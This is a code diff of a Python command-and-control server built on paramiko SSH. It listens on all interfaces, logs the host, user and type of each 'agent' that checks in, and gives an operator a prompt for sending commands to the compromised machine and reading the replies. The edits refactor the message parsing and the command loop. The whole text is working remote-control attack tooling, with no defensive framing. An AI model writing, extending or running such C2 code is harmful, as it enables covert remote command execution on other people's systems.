@@ -27,6 +27,7 @@ def main():
     server = "0.0.0.0" #To listen on all interfaces
     port = args.port
     HOSTKEY = paramiko.RSAKey.generate(2048)
+    SEPARATOR = "<&sep>"
 
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -43,25 +44,23 @@ def main():
     server = SSHServer()
     C2_Session.start_server(server=server)
     conn = C2_Session.accept()
-    print("\n[*] Debug info:\n" + str(conn)) #Debug info
+    print("\n[*] Debug info: " + str(conn)) #Debug info
     if conn is None:
         print("[!] Failled authentication.")
         sys.exit()
     success_msg = conn.recv(1024).decode()
-    host = success_msg.split(",")[0]
-    user = success_msg.split(",")[1]
-    type = success_msg.split(",")[2]
-    print(f"\n[*] Agent checked in from \"{host}\" ({type}) as \"{user}\".\n")
+    host, user, type = success_msg.split(SEPARATOR)
+    print(f'[*] Agent checked in from "{host}" {addr} ({type}) as "{user}".')
     conn.send(" ") #Connection breaks without this line
 
     def comm_handler():
         while True:
             try:
-                cmd_line = (f"|-- {user}@{host} \n|>> ")
+                cmd_line = (f"#> {user}@{host} >> ")
                 command = input(cmd_line + "")
                 head = command.split(" ")[0]
                 if head == "":
-                    comm_handler()
+                    continue
                 elif head == "!exit":
                     conn.send(command)
                     sys.exit()
@@ -70,7 +69,7 @@ def main():
                     incoming()
             except Exception as ex:
                 print(str(ex))
-                pass
+                continue
             except KeyboardInterrupt:
                 conn.send("!exit")
                 sys.exit()
@@ -83,10 +82,8 @@ def main():
             else:
                 while conn.recv_ready():
                     print(conn.recv(4096).decode())
-                comm_handler()
         except Exception as ex:
             print(str(ex))
-            comm_handler()
 
     comm_handler()
 
